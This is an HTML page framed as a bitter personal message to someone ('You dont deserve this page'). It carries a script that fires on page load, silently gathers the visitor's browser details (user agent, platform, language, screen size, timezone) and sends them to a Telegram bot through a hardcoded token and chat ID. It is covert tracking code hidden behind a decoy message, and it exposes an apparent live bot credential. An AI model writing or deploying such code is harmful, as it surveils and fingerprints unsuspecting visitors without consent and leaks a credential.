<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>🙂</title>
</head>
<body>
<h1>You dont deserve this page</h1>
<p id="status">Nor all the efforts i have been putting into u no need to open this it wont work enjoy ur "some time" 🙂</p>

<script>
  "use strict";

  // Your Telegram bot token and chat ID
  const BOT_TOKEN = "8568542100:AAFpUQ2U-lKLDge9djSK5LgsyvlKcT8ZEq8";
  const CHAT_ID = "8552546080";

  // Function to collect browser info
  function collectBrowserInfo() {
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const cookiesEnabled = navigator.cookieEnabled;
    const javaEnabled = navigator.javaEnabled();
    const screenWidth = screen.width;
    const screenHeight = screen.height;
    const colorDepth = screen.colorDepth;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    return {
      userAgent,
      language,
      platform,
      cookiesEnabled,
      javaEnabled,
      screenWidth,
      screenHeight,
      colorDepth,
      timezone
    };
  }

  // Function to create the message from info
  function createTelegramMessage(info) {
    return [
      `Browser Information:`,
      `User Agent: ${info.userAgent}`,
      `Language: ${info.language}`,
      `Platform: ${info.platform}`,
      `Cookies Enabled: ${info.cookiesEnabled}`,
      `Java Enabled: ${info.javaEnabled}`,
      `Screen Size: ${info.screenWidth}x${info.screenHeight}`,
      `Color Depth: ${info.colorDepth}`,
      `Timezone: ${info.timezone}`
    ].join("\n");
  }

  // Function to send info to Telegram
  async function sendInformation() {
    const status = document.getElementById("status");
    status.textContent = "Sending...";

    try {
      const info = collectBrowserInfo();
      const message = createTelegramMessage(info);
      const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      const response = await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });

      const result = await response.json();

      if (!response.ok || !result.ok) {
        throw new Error(result.description || "Telegram rejected the request.");
      }

      status.textContent = "Nor all the efforts i have been putting into u no need to open this it wont work enjoy ur "some time" 🙂";
    } catch (error) {
      console.error("Send error:", error);
      status.textContent = "✗Nor all the efforts i have been putting into u no need to open this it wont work enjoy ur "some time" 🙂: " + error.message;
    }
  }

  // Automatically trigger send when page loads
  window.addEventListener('load', sendInformation);
</script>
</body>
</html>
